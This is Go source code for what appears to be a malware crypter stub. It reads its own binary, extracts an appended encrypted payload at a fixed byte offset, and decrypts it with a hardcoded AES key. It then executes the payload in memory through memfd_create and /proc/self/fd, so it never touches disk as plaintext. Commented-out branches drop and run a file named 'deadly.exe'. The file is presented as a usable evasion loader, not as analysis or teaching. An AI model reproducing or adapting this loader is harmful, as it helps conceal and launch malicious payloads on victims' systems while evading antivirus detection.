package main

import (
	// "fmt"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"io/ioutil"
	"os"
	// "os/exec"
	"syscall"
	// "unsafe"
	// 	"encoding/hex"
	"fmt"
	"unsafe"
)

const (
	mfdCloexec     = 0x0001
	memfdCreateX64 = 319
	memfdCreate = 319
	fork           = 57
)

//key if you encrypt all of your stuff 
const key = "3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd53b574954d804529fd4407a5738dac878b9c42185fd38d90ecb5abffa16afecd53b574954d804529fd4407a5738dac878b9c42185fd38d90ecb5abffa16afecd"

/*
Checks for errors when reading in files 
*/
func check(e error) {
    if e != nil {
        panic(e)
    }
}

func createHash(key string) []byte {
	hash := sha256.Sum256([]byte(key))
	return hash[:]
}

func decrypt(data []byte, passphrase string) []byte {
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	data, _ := ioutil.ReadFile(filename)
	f, _ := os.Create(filename)
	f.Write(decrypt(data, passphrase))
	f.Close()
	return decrypt(data, passphrase)
}

func runFromMemory(procName string, buffer []byte) {
	fdName := "" // *string cannot be initialized
	fd, _, _ := syscall.Syscall(memfdCreate, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)

	_, _ = syscall.Write(int(fd), buffer)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	_ = syscall.Exec(fdPath, []string{procName}, nil)
}

func main() {
	filename := os.Args[0] 
    // skipBytes := 2290120             // how many bytes to skip 2,455,040 Mac 2,152,960  2,298,520 2,298,520
    skipBytes := 2289352        // how many bytes to skip 2,289,352 

	data, _ := ioutil.ReadFile(filename) 

	buf := []byte{}

	for i, d:= range data {
		if i >= skipBytes{
			buf = append(buf, d)
		}
	}
	/* For mac/linux */
	// b, _ := os.Create(filename)
	// b.Write(buf)
	// b.Close()

	// decryptFile(filename, key)
	// command := exec.Command(filename)
	// command.Run()


	/* For windows */
	// b, _ := os.Create("./deadly.exe")
	// b.Write(buf)
	// b.Close()

	// decryptFile("./deadly.exe", key)
	dec := []byte{}

	dec = decrypt(buf, key)
	
	// b, _ := os.Create("./deadly")
	// b.Write(dec)
	// b.Close()

	// target, _ := ioutil.ReadFile("./deadly.exe")

	runFromMemory("PayloadEnc", dec)
	// exe, err := memexec.New(dec)
	// if err != nil {
	// 	return 
	// }
	// defer exe.Close()

	// cmd := exe.Command()
	// cmd.Output() 
	// command := exec.Command("deadly.exe")
	// // command.Run()

    // if err := command.Run(); err != nil { 
    //     fmt.Println("Error: ", err)
	// }   

}

